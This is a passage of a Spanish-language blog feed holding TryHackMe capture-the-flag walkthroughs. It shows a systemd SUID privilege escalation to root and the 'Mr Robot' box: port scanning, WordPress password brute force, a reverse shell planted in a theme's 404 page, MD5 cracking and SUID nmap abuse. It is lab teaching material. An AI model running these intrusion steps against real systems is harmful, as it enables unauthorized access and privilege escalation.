  &lt;li&gt;mediante el servicio creado le damos permisos &lt;em&gt;SUID&lt;/em&gt; a &lt;em&gt;/bin/bash&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;confirmamos que somos usuarios &lt;em&gt;root&lt;/em&gt; y leemos la flag
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ TF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;.service
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[Service]
Type=oneshot
ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;
[Install]
WantedBy=multi-user.target'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
/bin/systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
/bin/systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;Created symlink from /etc/systemd/system/tmp.0KBttF7QOg.service to /tmp/tmp.0KBttF7QOg.service.
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.0KBttF7QOg.service to /tmp/tmp.0KBttF7QOg.service.
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/bash
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root root 1037528 May 16  2017 /bin/bash
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
x5xfxxxx9fxax27x36xd3xax9x6c7xd5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;blockquote&gt;
      &lt;p&gt;Become root and get the last flag (/root/root.txt)&lt;br /&gt;
x5xfx85x9x0x9x7x6xd33ax9x6cxfx5&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ol&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="Nmap" /><category term="Gobuster" /><category term="Burp suite" /><summary type="html">Obtenga información sobre reconocimiento activo, ataques a aplicaciones web y escalada de privilegios.</summary></entry><entry><title type="html">tryhackme: Mr Robot</title><link href="http://localhost:4000/MrRobot/" rel="alternate" type="text/html" title="tryhackme: Mr Robot" /><published>2021-11-01T00:00:00-05:00</published><updated>2021-11-01T00:00:00-05:00</updated><id>http://localhost:4000/MrRobot</id><content type="html" xml:base="http://localhost:4000/MrRobot/">&lt;h1 id=&quot;comprobaremos-que-la-maquina-se-encuentre-activa&quot;&gt;Comprobaremos que la maquina se encuentre activa&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.115.49
PING 10.10.115.49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.115.49&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
64 bytes from 10.10.115.49: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;162 ms

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.115.49 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 161.950/161.950/161.950/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Efectivamente, vemos que recibio el paquete enviado, ahora comprabaremos que &lt;em&gt;OS&lt;/em&gt; tiene la maquina&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.115.49

10.10.115.49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya hemos confirmado que estamos con una maquina &lt;em&gt;linux&lt;/em&gt; mediante 2 formas diferentes&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1 mediante el &lt;em&gt;ttl&lt;/em&gt; que obtuvimos del comando ping&lt;/li&gt;
  &lt;li&gt;2 la uilidad -&lt;a href=&quot;s4vitar.github.io&quot;&gt;WichSystem.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;realizamos-un-escaneo-de-puertos&quot;&gt;Realizamos un escaneo de puertos&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; 10.10.115.49 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-01 14:30 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Failed to resolve &lt;span class=&quot;s2&quot;&gt;&quot;n&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.115.49
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 closed tcp port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;3.03 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;obtenemos-una-mejor-vista-de-los-puertos-abiertos-mediante-la-utilidad-extractpors-ademas-de-que-nos-los-copia&quot;&gt;obtenemos una mejor vista de los puertos abiertos mediante la utilidad &lt;em&gt;extractPors&lt;/em&gt;, ademas de que nos los copia&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
   3   │ 
   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.115.49
   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 80,443
   6   │ 
   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
   8   │ 
───────┴──────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Buscamos posibles vulnerabilidades en los puertos con &lt;em&gt;nmap&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,443 10.10.115.49
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-01 14:31 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.115.49
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn'&lt;/span&gt;t have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
|_http-server-header: Apache
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;22.80 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;vemos la pagina web del sitio y miramos a ver que nos llama la atencion&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/MrRobot/server.txt&quot; alt=&quot;server.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;buscamos en &lt;em&gt;robots.txt&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/MrRobot/robots.txt&quot; alt=&quot;robots.txt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;encontramos 2 posibles rutas&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
 fsocity.dic
 key-1-of-3.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;fsocity.dic&lt;/em&gt; contiene posibles nombres de usuarios y/o contraseñas&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;key-1-of-3.txt&lt;/em&gt; contiene una la primer &lt;em&gt;flag&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;hacemos-una-pausa-para-ver-los-posibles-vectores-de-ataque-que-tenemos&quot;&gt;hacemos una pausa para ver los posibles &lt;em&gt;vectores de ataque&lt;/em&gt; que tenemos&lt;/h1&gt;

&lt;p&gt;mientras esperamos que termine el escaneo con &lt;em&gt;gobuster&lt;/em&gt; intentaremos hacer una identificación de usuarios mediante el login ya que
nos permite una enumeración de usuarios&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;luego de probar varios posibles usuarios encontramos que &lt;em&gt;Elliot&lt;/em&gt; es un usuario valido (bastante logico, si recordamos el nombre
de la maquina)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;vamos ver cuantas lineas tiene el diccionario &lt;em&gt;fsocity.dic&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fsocity.dic | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
858160
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;es un archivo bastante grande, por si acaso eliminaremos los duplicados&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;sort: ordemamos las parabras&lt;/li&gt;
  &lt;li&gt;uniq: eliminamos las repetidas
Vemos que ahora solo tenemos 11.451 lineas&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sort &lt;/span&gt;fsocity.dic | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt
❯ &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; users.txt
11451 users.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ahora-pasaremos-a-intentar-hacerle-fuerza-bruta-al-login-con-el-archivo-fsocitydic-luego-del-tratamiento-userstxtencontrado-antes&quot;&gt;ahora pasaremos a intentar hacerle fuerza bruta al login con el archivo fsocity.dic (luego del tratamiento, users.txt)encontrado antes&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;primero realize brute force con &lt;em&gt;hydra&lt;/em&gt;, pero luego de mucho tiempo lo cancele e intente con &lt;em&gt;wpscan&lt;/em&gt; y tarde menos de 5 minutos&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://10.10.1.9 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; elliot &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; users.txt

&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Valid Combinations Found:
 | Username: elliot, Password: ER28-0652
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;luego de la espera, tenemos el usuario &lt;em&gt;Elliot&lt;/em&gt; y la contraseña &lt;em&gt;ER28-0652&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/MrRobot/worpress.png&quot; alt=&quot;imagen worpress.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Miraremos la pagina de administración e inspeccinamos a ver que podemos hacer para obtener una &lt;em&gt;reverse shell&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;intentare usar la pagina de &lt;em&gt;error404.php&lt;/em&gt; para ganar acceso desde mi maquina&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;editamos el archivo &lt;em&gt;error404.php&lt;/em&gt; con nuestra &lt;em&gt;shell&lt;/em&gt; y pongo mi maquina en escucha&lt;/p&gt;

&lt;h2 id=&quot;ganamos-acceso&quot;&gt;Ganamos acceso&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 1234
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.9.50.132] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.106.35] 46851
Linux linux 3.13.0-55-generic &lt;span class=&quot;c&quot;&gt;#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
 12:56:23 up 52 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Cambiamos la bash por python por una terminal “mejor”&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
daemon@linux:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;al movernos al directorio &lt;em&gt;home/robot&lt;/em&gt; encontramos archivos interesantes&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daemon@linux:/home/robot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;key-2-of-3.txt	password.raw-md5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;no podemos leer el archivo que inicia con &lt;em&gt;key&lt;/em&gt;, sin embargo, con &lt;em&gt;password.raw-md5&lt;/em&gt; la historia es otra
lo abrimos e intuimos (como su nombre lo indica) que es una key encriptada con &lt;em&gt;md5&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daemon@linux:/home/robot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key-2-of-3.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key-2-of-3.txt

&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;password.raw-md5

&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;intentaremos desencriptar el &lt;em&gt;hash&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;c3fcd3d76192e4007dfb496cca67e13b&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; key-md5.txt

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;hash-identifier c3fcd3d76192e4007dfb496cca67e13b

❯ hashcat &lt;span class=&quot;nt&quot;&gt;-m0&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--force&lt;/span&gt; key-md5.txt /home/blanco/Desktop/thm/MrRobot/rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;luego de la espera,tenemos la contraseña del usuario &lt;em&gt;robot&lt;/em&gt;
obtenemos la flag y buscamos la manera de escalar privilegios&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aemon@linux:/home/robot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su robot
su robot
Password: xbxxexxhxjxlxxxpxxstxvwxxz

robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;key-2-of-3.txt	password.raw-md5
robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;ke&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;ke&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
82xc7x956x84fx93xxxbxdexebx9f959
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ahora-a-buscar-la-manera-de-obtener-privilegios-root&quot;&gt;ahora a buscar la manera de obtener privilegios root&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;--perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null

/usr/local/bin/nmap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;llama la atención que &lt;em&gt;nmap&lt;/em&gt; tenga privilegios SUID, probar usar &lt;a href=&quot;https://gtfobins.github.io/gtfobins/nmap/#suid&quot;&gt;gtfobis&lt;/a&gt; 
para abusar de dichos privilegios&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/nmap &lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;
/usr/local/bin/nmap &lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;

Starting nmap V. 3.81 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://www.insecure.org/nmap/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
